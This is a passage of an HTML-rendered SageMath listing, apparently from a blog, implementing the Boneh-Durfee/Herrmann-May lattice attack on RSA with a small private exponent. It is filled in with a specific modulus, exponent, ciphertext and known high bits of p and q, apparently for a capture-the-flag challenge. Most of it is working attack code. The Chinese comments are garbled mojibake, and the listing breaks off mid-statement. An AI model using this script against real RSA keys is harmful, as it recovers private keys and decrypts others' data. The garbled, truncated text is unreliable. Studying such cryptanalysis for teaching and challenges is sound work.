class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line">time.clock = time.time</span><br><span class="line"> </span><br><span class="line">debug = <span class="literal">True</span></span><br><span class="line"> </span><br><span class="line">strict = <span class="literal">False</span></span><br><span class="line"> </span><br><span class="line">helpful_only = <span class="literal">True</span></span><br><span class="line">dimension_min = <span class="number">7</span> <span class="comment"># Â¶ÇÊûúÊô∂Ê†ºËææÂà∞ËØ•Â∞∫ÂØ∏ÔºåÂàôÂÅúÊ≠¢ÁßªÈô§</span></span><br><span class="line"><span class="comment"># ÊòæÁ§∫ÊúâÁî®Áü¢ÈáèÁöÑÁªüËÆ°Êï∞ÊçÆ</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">helpful_vectors</span>(<span class="params">BB, modulus</span>):</span><br><span class="line">    nothelpful = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> ii <span class="keyword">in</span> <span class="built_in">range</span>(BB.dimensions()[<span class="number">0</span>]):</span><br><span class="line">        <span class="keyword">if</span> BB[ii,ii] &gt;= modulus:</span><br><span class="line">            nothelpful += <span class="number">1</span></span><br><span class="line">            </span><br><span class="line">    <span class="built_in">print</span> (nothelpful, <span class="string">&quot;/&quot;</span>, BB.dimensions()[<span class="number">0</span>], <span class="string">&quot; vectors are not helpful&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># ÊòæÁ§∫Â∏¶Êúâ 0 Âíå X ÁöÑÁü©Èòµ</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">matrix_overview</span>(<span class="params">BB, bound</span>):</span><br><span class="line">    <span class="keyword">for</span> ii <span class="keyword">in</span> <span class="built_in">range</span>(BB.dimensions()[<span class="number">0</span>]):</span><br><span class="line">        a = (<span class="string">&#x27;%02d &#x27;</span> % ii)</span><br><span class="line">        <span class="keyword">for</span> jj <span class="keyword">in</span> <span class="built_in">range</span>(BB.dimensions()[<span class="number">1</span>]):</span><br><span class="line">            a += <span class="string">&#x27;0&#x27;</span> <span class="keyword">if</span> BB[ii,jj] == <span class="number">0</span> <span class="keyword">else</span> <span class="string">&#x27;X&#x27;</span></span><br><span class="line">            <span class="keyword">if</span> BB.dimensions()[<span class="number">0</span>] &lt; <span class="number">60</span>: </span><br><span class="line">                a += <span class="string">&#x27; &#x27;</span></span><br><span class="line">        <span class="keyword">if</span> BB[ii, ii] &gt;= bound:</span><br><span class="line">            a += <span class="string">&#x27;~&#x27;</span></span><br><span class="line">        <span class="comment">#print (a)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Â∞ùËØïÂà†Èô§Êó†Áî®ÁöÑÂêëÈáè</span></span><br><span class="line"><span class="comment"># ‰ªéÂΩìÂâç = n-1ÔºàÊúÄÂêé‰∏Ä‰∏™ÂêëÈáèÔºâÂºÄÂßã</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">remove_unhelpful</span>(<span class="params">BB, monomials, bound, current</span>):</span><br><span class="line">    <span class="comment"># Êàë‰ª¨‰ªéÂΩìÂâç = n-1ÔºàÊúÄÂêé‰∏Ä‰∏™ÂêëÈáèÔºâÂºÄÂßã</span></span><br><span class="line">    <span class="keyword">if</span> current == -<span class="number">1</span> <span class="keyword">or</span> BB.dimensions()[<span class="number">0</span>] &lt;= dimension_min:</span><br><span class="line">        <span class="keyword">return</span> BB</span><br><span class="line"> </span><br><span class="line">    <span class="comment"># ÂºÄÂßã‰ªéÂêéÈù¢Ê£ÄÊü•</span></span><br><span class="line">    <span class="keyword">for</span> ii <span class="keyword">in</span> <span class="built_in">range</span>(current, -<span class="number">1</span>, -<span class="number">1</span>):</span><br><span class="line">        <span class="comment">#  Â¶ÇÊûúÂÆÉÊ≤°ÊúâÁî®</span></span><br><span class="line">        <span class="keyword">if</span> BB[ii, ii] &gt;= bound:</span><br><span class="line">            affected_vectors = <span class="number">0</span></span><br><span class="line">            affected_vector_index = <span class="number">0</span></span><br><span class="line">             <span class="comment"># ËÆ©Êàë‰ª¨Ê£ÄÊü•ÂÆÉÊòØÂê¶ÂΩ±ÂìçÂÖ∂‰ªñÂêëÈáè</span></span><br><span class="line">            <span class="keyword">for</span> jj <span class="keyword">in</span> <span class="built_in">range</span>(ii + <span class="number">1</span>, BB.dimensions()[<span class="number">0</span>]):</span><br><span class="line">                <span class="comment"># Â¶ÇÊûúÂè¶‰∏Ä‰∏™ÂêëÈáèÂèóÂà∞ÂΩ±ÂìçÔºö</span></span><br><span class="line">                <span class="comment"># Êàë‰ª¨Â¢ûÂä†ËÆ°Êï∞</span></span><br><span class="line">                <span class="keyword">if</span> BB[jj, ii] != <span class="number">0</span>:</span><br><span class="line">                    affected_vectors += <span class="number">1</span></span><br><span class="line">                    affected_vector_index = jj</span><br><span class="line"> </span><br><span class="line">            <span class="comment"># Á≠âÁ∫ßÔºö0</span></span><br><span class="line">            <span class="comment"># Â¶ÇÊûúÊ≤°ÊúâÂÖ∂‰ªñËΩΩ‰ΩìÊúÄÁªàÂèóÂà∞ÂΩ±Âìç</span></span><br><span class="line">            <span class="comment"># Êàë‰ª¨Âà†Èô§ÂÆÉ</span></span><br><span class="line">            <span class="keyword">if</span> affected_vectors == <span class="number">0</span>:</span><br><span class="line">                <span class="comment">#print (&quot;* removing unhelpful vector&quot;, ii)</span></span><br><span class="line">                BB = BB.delete_columns([ii])</span><br><span class="line">                BB = BB.delete_rows([ii])</span><br><span class="line">                monomials.pop(ii)</span><br><span class="line">                BB = remove_unhelpful(BB, monomials, bound, ii-<span class="number">1</span>)</span><br><span class="line">                <span class="keyword">return</span> BB</span><br><span class="line"> </span><br><span class="line">           <span class="comment"># Á≠âÁ∫ßÔºö1</span></span><br><span class="line">            <span class="comment">#Â¶ÇÊûúÂè™Êúâ‰∏Ä‰∏™ÂèóÂà∞ÂΩ±ÂìçÔºåÊàë‰ª¨‰ºöÊ£ÄÊü•</span></span><br><span class="line">            <span class="comment"># Â¶ÇÊûúÂÆÉÊ≠£Âú®ÂΩ±ÂìçÂà´ÁöÑÂêëÈáè</span></span><br><span class="line">            <span class="keyword">elif</span> affected_vectors == <span class="number">1</span>:</span><br><span class="line">                affected_deeper = <span class="literal">True</span></span><br><span class="line">                <span class="keyword">for</span> kk <span class="keyword">in</span> <span class="built_in">range</span>(affected_vector_index + <span class="number">1</span>, BB.dimensions()[<span class="number">0</span>]):</span><br><span class="line">                    <span class="comment"># Â¶ÇÊûúÂÆÉÂΩ±ÂìçÂì™ÊÄï‰∏Ä‰∏™ÂêëÈáè</span></span><br><span class="line">                    <span class="comment"># Êàë‰ª¨ÊîæÂºÉËøô‰∏™</span></span><br><span class="line">                    <span class="keyword">if</span> BB[kk, affected_vector_index] != <span class="number">0</span>:</span><br><span class="line">                        affected_deeper = <span class="literal">False</span></span><br><span class="line">                <span class="comment"># Â¶ÇÊûúÊ≤°ÊúâÂÖ∂‰ªñÂêëÈáèÂèóÂà∞ÂΩ±ÂìçÔºåÂàôÂ∞ÜÂÖ∂Âà†Èô§ÔºåÂπ∂‰∏î</span></span><br><span class="line">                <span class="comment"># Ëøô‰∏™ÊúâÁî®ÁöÑÂêëÈáè‰∏çÂ§üÊúâÁî®</span></span><br><span class="line">                <span class="comment">#‰∏éÊàë‰ª¨Êó†Áî®ÁöÑÁõ∏ÊØî</span></span><br><span class="line">                <span class="keyword">if</span> affected_deeper <span class="keyword">and</span> <span class="built_in">abs</span>(bound - BB[affected_vector_index, affected_vector_index]) &lt; <span class="built_in">abs</span>(bound - BB[ii, ii]):</span><br><span class="line">                    <span class="comment">#print (&quot;* removing unhelpful vectors&quot;, ii, &quot;and&quot;, affected_vector_index)</span></span><br><span class="line">                    BB = BB.delete_columns([affected_vector_index, ii])</span><br><span class="line">                    BB = BB.delete_rows([affected_vector_index, ii])</span><br><span class="line">                    monomials.pop(affected_vector_index)</span><br><span class="line">                    monomials.pop(ii)</span><br><span class="line">                    BB = remove_unhelpful(BB, monomials, bound, ii-<span class="number">1</span>)</span><br><span class="line">                    <span class="keyword">return</span> BB</span><br><span class="line">    <span class="comment"># nothing happened</span></span><br><span class="line">    <span class="keyword">return</span> BB</span><br><span class="line"> </span><br><span class="line"><span class="string">&quot;&quot;&quot; </span></span><br><span class="line"><span class="string">Returns:</span></span><br><span class="line"><span class="string">* 0,0   if it fails</span></span><br><span class="line"><span class="string">* -1Ôºå-1 Â¶ÇÊûú &quot;strict=true&quot;ÔºåÂπ∂‰∏îË°åÂàóÂºè‰∏çÂèóÁ∫¶Êùü</span></span><br><span class="line"><span class="string">* x0,y0 the solutions of `pol`</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">boneh_durfee</span>(<span class="params">pol, modulus, mm, tt, XX, YY</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Boneh and Durfee revisited by Herrmann and May</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string"> Âú®‰ª•‰∏ãÊÉÖÂÜµ‰∏ãÊâæÂà∞Ëß£ÂÜ≥ÊñπÊ°àÔºö</span></span><br><span class="line"><span class="string">* d &lt; N^delta</span></span><br><span class="line"><span class="string">* |x|&lt; e^delta</span></span><br><span class="line"><span class="string">* |y|&lt; e^0.5</span></span><br><span class="line"><span class="string">ÊØèÂΩì delta &lt; 1 - sqrtÔºà2Ôºâ/2 ~ 0.292</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"> </span><br><span class="line">    <span class="comment"># substitution (Herrman and May)</span></span><br><span class="line">    PR.&lt;u, x, y&gt; = PolynomialRing(ZZ)   <span class="comment">#Â§öÈ°πÂºèÁéØ</span></span><br><span class="line">    Q = PR.quotient(x*y + <span class="number">1</span> - u)        <span class="comment">#  u = xy + 1</span></span><br><span class="line">    polZ = Q(pol).lift()</span><br><span class="line"> </span><br><span class="line">    UU = XX*YY + <span class="number">1</span></span><br><span class="line"> </span><br><span class="line">    <span class="comment"># x-Áßª‰Ωç</span></span><br><span class="line">    gg = []</span><br><span class="line">    <span class="keyword">for</span> kk <span class="keyword">in</span> <span class="built_in">range</span>(mm + <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> ii <span class="keyword">in</span> <span class="built_in">range</span>(mm - kk + <span class="number">1</span>):</span><br><span class="line">            xshift = x^ii * modulus^(mm - kk) * polZ(u, x, y)^kk</span><br><span class="line">            gg.append(xshift)</span><br><span class="line">    gg.sort()</span><br><span class="line"> </span><br><span class="line">    <span class="comment"># ÂçïÈ°πÂºè x Áßª‰ΩçÂàóË°®</span></span><br><span class="line">    monomials = []</span><br><span class="line">    <span class="keyword">for</span> polynomial <span class="keyword">in</span> gg:</span><br><span class="line">        <span class="keyword">for</span> monomial <span class="keyword">in</span> polynomial.monomials(): <span class="comment">#ÂØπ‰∫éÂ§öÈ°πÂºè‰∏≠ÁöÑÂçïÈ°πÂºè„ÄÇÂçïÈ°πÂºèÔºàÔºâÔºö</span></span><br><span class="line">            <span class="keyword">if</span> monomial <span class="keyword">not</span> <span class="keyword">in</span> monomials:  <span class="comment"># Â¶ÇÊûúÂçïÈ°π‰∏çÂú®ÂçïÈ°π‰∏≠</span></span><br><span class="line">                monomials.append(monomial)</span><br><span class="line">    monomials.sort()</span><br><span class="line"> </span><br><span class="line">    <span class="comment"># y-Áßª‰Ωç</span></span><br><span class="line">    <span class="keyword">for</span> jj <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, tt + <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> kk <span class="keyword">in</span> <span class="built_in">range</span>(floor(mm/tt) * jj, mm + <span class="number">1</span>):</span><br><span class="line">            yshift = y^jj * polZ(u, x, y)^kk * modulus^(mm - kk)</span><br><span class="line">            yshift = Q(yshift).lift()</span><br><span class="line">            gg.append(yshift) <span class="comment"># substitution</span></span><br><span class="line"> </span><br><span class="line">    <span class="comment"># ÂçïÈ°πÂºè y Áßª‰ΩçÂàóË°®</span></span><br><span class="line">    <span class="keyword">for</span> jj <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, tt + <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> kk <span class="keyword">in</span> <span class="built_in">range</span>(floor(mm/tt) * jj, mm + <span class="number">1</span>):</span><br><span class="line">            monomials.append(u^kk * y^jj)</span><br><span class="line"> </span><br><span class="line">    <span class="comment"># ÊûÑÈÄ†Ê†º B</span></span><br><span class="line">    nn = <span class="built_in">len</span>(monomials)</span><br><span class="line">    BB = Matrix(ZZ, nn)</span><br><span class="line">    <span class="keyword">for</span> ii <span class="keyword">in</span> <span class="built_in">range</span>(nn):</span><br><span class="line">        BB[ii, <span class="number">0</span>] = gg[ii](<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">for</span> jj <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, ii + <span class="number">1</span>):</span><br><span class="line">            <span class="keyword">if</span> monomials[jj] <span class="keyword">in</span> gg[ii].monomials():</span><br><span class="line">                BB[ii, jj] = gg[ii].monomial_coefficient(monomials[jj]) * monomials[jj](UU,XX,YY)</span><br><span class="line"> </span><br><span class="line">    <span class="comment">#Á∫¶ÂåñÊ†ºÁöÑÂéüÂûã</span></span><br><span class="line">    <span class="keyword">if</span> helpful_only:</span><br><span class="line">        <span class="comment">#  #Ëá™Âä®Âà†Èô§</span></span><br><span class="line">        BB = remove_unhelpful(BB, monomials, modulus^mm, nn-<span class="number">1</span>)</span><br><span class="line">        <span class="comment"># ÈáçÁΩÆÁª¥Â∫¶</span></span><br><span class="line">        nn = BB.dimensions()[<span class="number">0</span>]</span><br><span class="line">        <span class="keyword">if</span> nn == <span class="number">0</span>:</span><br><span class="line">            <span class="built_in">print</span> (<span class="string">&quot;failure&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>,<span class="number">0</span></span><br><span class="line"> </span><br><span class="line">    <span class="comment"># Ê£ÄÊü•ÂêëÈáèÊòØÂê¶ÊúâÂ∏ÆÂä©</span></span><br><span class="line">    <span class="keyword">if</span> debug:</span><br><span class="line">        helpful_vectors(BB, modulus^mm)</span><br><span class="line"> </span><br><span class="line">    <span class="comment"># Ê£ÄÊü•Ë°åÂàóÂºèÊòØÂê¶Ê≠£Á°ÆÁïåÂÆö</span></span><br><span class="line">    det = BB.det()</span><br><span class="line">    bound = modulus^(mm*nn)</span><br><span class="line">    <span class="keyword">if</span> det &gt;= bound:</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&quot;We do not have det &lt; bound. Solutions might not be found.&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&quot;Try with highers m and t.&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> debug:</span><br><span class="line">            diff = (log(det) - log(bound)) / log(<span class="number">2</span>)</span><br><span class="line">            <span class="built_in">print</span> (<span class="string">&quot;size det(L) - size e^(m*n) = &quot;</span>, floor(diff))</span><br><span class="line">        <span class="keyword">if</span> strict:</span><br><span class="line">            <span class="keyword">return</span> -<span class="number">1</span>, -<span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&quot;det(L) &lt; e^(m*n) (good! If a solution exists &lt; N^delta, it will be found)&quot;</span>)</span><br><span class="line"> </span><br><span class="line">    <span class="comment"># display the lattice basis</span></span><br><span class="line">    <span class="keyword">if</span> debug:</span><br><span class="line">        matrix_overview(BB, modulus^mm)</span><br><span class="line"> </span><br><span class="line">    <span class="comment"># LLL</span></span><br><span class="line">    <span class="keyword">if</span> debug:</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&quot;optimizing basis of the lattice via LLL, this can take a long time&quot;</span>)</span><br><span class="line"> </span><br><span class="line">    <span class="comment">#BB = BB.BKZ(block_size=25)</span></span><br><span class="line">    BB = BB.LLL()</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span> debug:</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&quot;LLL is done!&quot;</span>)</span><br><span class="line"> </span><br><span class="line">    <span class="comment"># ÊõøÊç¢ÂêëÈáè i Âíå j -&gt;Â§öÈ°πÂºè 1 Âíå 2</span></span><br><span class="line">    <span class="keyword">if</span> debug:</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&quot;Âú®Ê†º‰∏≠ÂØªÊâæÁ∫øÊÄßÊó†ÂÖ≥ÂêëÈáè&quot;</span>)</span><br><span class="line">    found_polynomials = <span class="literal">False</span></span><br><span class="line"> </span><br><span class="line">    <span class="keyword">for</span> pol1_idx <span class="keyword">in</span> <span class="built_in">range</span>(nn - <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> pol2_idx <span class="keyword">in</span> <span class="built_in">range</span>(pol1_idx + <span class="number">1</span>, nn):</span><br><span class="line"> </span><br><span class="line">            <span class="comment"># ÂØπ‰∫éi and j, ÊûÑÈÄ†‰∏§‰∏™Â§öÈ°πÂºè</span></span><br><span class="line"> </span><br><span class="line">            PR.&lt;w,z&gt; = PolynomialRing(ZZ)</span><br><span class="line">            pol1 = pol2 = <span class="number">0</span></span><br><span class="line">            <span class="keyword">for</span> jj <span class="keyword">in</span> <span class="built_in">range</span>(nn):</span><br><span class="line">                pol1 += monomials[jj](w*z+<span class="number">1</span>,w,z) * BB[pol1_idx, jj] / monomials[jj](UU,XX,YY)</span><br><span class="line">                pol2 += monomials[jj](w*z+<span class="number">1</span>,w,z) * BB[pol2_idx, jj] / monomials[jj](UU,XX,YY)</span><br><span class="line"> </span><br><span class="line">            <span class="comment"># ÁªìÊûú</span></span><br><span class="line">            PR.&lt;q&gt; = PolynomialRing(ZZ)</span><br><span class="line">            rr = pol1.resultant(pol2)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">            <span class="keyword">if</span> rr.is_zero() <span class="keyword">or</span> rr.monomials() == [<span class="number">1</span>]:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span> (<span class="string">&quot;found them, using vectors&quot;</span>, pol1_idx, <span class="string">&quot;and&quot;</span>, pol2_idx)</span><br><span class="line">                found_polynomials = <span class="literal">True</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> found_polynomials:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> found_polynomials:</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&quot;no independant vectors could be found. This should very rarely happen...&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>, <span class="number">0</span></span><br><span class="line"> </span><br><span class="line">    rr = rr(q, q)</span><br><span class="line"> </span><br><span class="line">    <span class="comment"># solutions</span></span><br><span class="line">    soly = rr.roots()</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(soly) == <span class="number">0</span>:</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&quot;Your prediction (delta) is too small&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>, <span class="number">0</span></span><br><span class="line"> </span><br><span class="line">    soly = soly[<span class="number">0</span>][<span class="number">0</span>]</span><br><span class="line">    ss = pol1(q, soly)</span><br><span class="line">    solx = ss.roots()[<span class="number">0</span>][<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">return</span> solx, soly</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">example</span>():</span><br><span class="line">    <span class="comment">############################################</span></span><br><span class="line">    <span class="comment"># ÈöèÊú∫ÁîüÊàêÊï∞ÊçÆ</span></span><br><span class="line">    <span class="comment">##########################################</span></span><br><span class="line">    <span class="comment">#start_time =time.perf_counter</span></span><br><span class="line">    start =time.clock()</span><br><span class="line">    size=<span class="number">512</span></span><br><span class="line">    length_N = <span class="number">2</span>*size;</span><br><span class="line">    ss=<span class="number">0</span></span><br><span class="line">    s=<span class="number">70</span>;</span><br><span class="line">    M=<span class="number">1</span>   <span class="comment"># the number of experiments</span></span><br><span class="line">    delta = <span class="number">299</span>/<span class="number">1024</span></span><br><span class="line">    <span class="comment"># p =  random_prime(2^512,2^511)</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(M):</span><br><span class="line"><span class="comment">#         p =  random_prime(2^size,None,2^(size-1))</span></span><br><span class="line"><span class="comment">#         q =  random_prime(2^size,None,2^(size-1))</span></span><br><span class="line"><span class="comment">#         if(p&lt;q):</span></span><br><span class="line"><span class="comment">#             temp=p</span></span><br><span class="line"><span class="comment">#             p=q</span></span><br><span class="line"><span class="comment">#             q=temp</span></span><br><span class="line">        N = <span class="number">69207225407236621802315929835231678761546030648552499878532449478584182354765750349071726491300234635799981022731725455349420914234822062855723904939138000102040435210706843712478106458961468791872716857992483073814316706027260218386995042614451566024972455009936823034721213885693157803402838690192435869721</span></span><br><span class="line">        e = <span class="number">28439197921283357831697812537770489393495780585893113255835906777860388696994349687910509232020125501124985537099309478678733953591875352794038209770419925216539701941346792691704315717440469781000758533118851176304883130375842134875219545766782891367082825940026559693057872966937790726617783138946733512771</span></span><br><span class="line">        c = <span class="number">22634701644450101524194718626550730546669791908217195025458791096208664618277869132516992188391372685210476489439282043033169958992171845152117468239445520601245104073454741171223045094363461153069787573765111331214431209598625611554915848071794889073522221012875111880946316417640573688399584093700714982302</span></span><br><span class="line">        hint1 = <span class="number">654543761191063613807</span>  <span class="comment"># pÈ´ò‰Ωç</span></span><br><span class="line">        hint2 = <span class="number">819778612327847774041</span>  <span class="comment"># qÈ´ò‰Ωç</span></span><br><span class="line"><span class="comment">#         print (&quot;pÁúüÂÆûÈ´ò&quot;,s,&quot;ÊØîÁâπÔºö&quot;, int(p/2^(512-s)))</span></span><br><span class="line"><span class="comment">#         print (&quot;qÁúüÂÆûÈ´ò&quot;,s,&quot;ÊØîÁâπÔºö&quot;, int(q/2^(512-s)))</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">#         N = p*q;</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">    <span class="comment"># Ëß£ÂØÜÊåáÊï∞dÁöÑÊåáÊï∞( ÊúÄÂ§ß0.292)</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">        m = <span class="number">7</span>   <span class="comment"># Ê†ºÂ§ßÂ∞èÔºàË∂äÂ§ßË∂äÂ•Ω/Ë∂äÊÖ¢Ôºâ</span></span><br><span class="line">        t = <span class="built_in">round</span>(((<span class="number">1</span>-<span class="number">2</span>*delta) * m))  <span class="comment"># Êù•Ëá™ Herrmann Âíå May ÁöÑ‰ºòÂåñ</span></span><br><span class="line">        X = floor(N^delta)  <span class="comment"># </span></span><br><span class="line">        Y = floor(N^(<span class="number">1</span>/<span class="number">2</span>)/<span class="number">2</span>^s)    <span class="comment"># Â¶ÇÊûú p„ÄÅ q Â§ßÂ∞èÁõ∏ÂêåÔºåÂàôÊ≠£Á°Æ</span></span><br><span class="line">        <span class="keyword">for</span> l <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">int</span>(hint1),<span class="built_in">int</span>(hint1)+<span class="number">1</span>):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;\n\n\n l=&#x27;</span>,l)</span><br><span class="line">            pM=l;</span><br><span class="line">            p0=pM*<span class="number">2</span>^(size-s)+<span class="number">2</span>^(size-s)-<span class="number">1</span>;</span><br><span class="line">            q0=N/p0;</span><br><span class="line">            qM=<span class="built_in">int</span>(q0/<span class="number">2</span>^(size-s))</span><br><span class="line">            A = N + <span class="number">1</span>-pM*<span class="number">2</span>^(size-s)-qM*<span class="number">2</span>^(size-s);</span><br><span class="line">        <span class="comment">#A = N+1</span></span><br><span class="line">            P.&lt;x,y&gt; = PolynomialRing(ZZ)</span><br><span class="line">            pol = 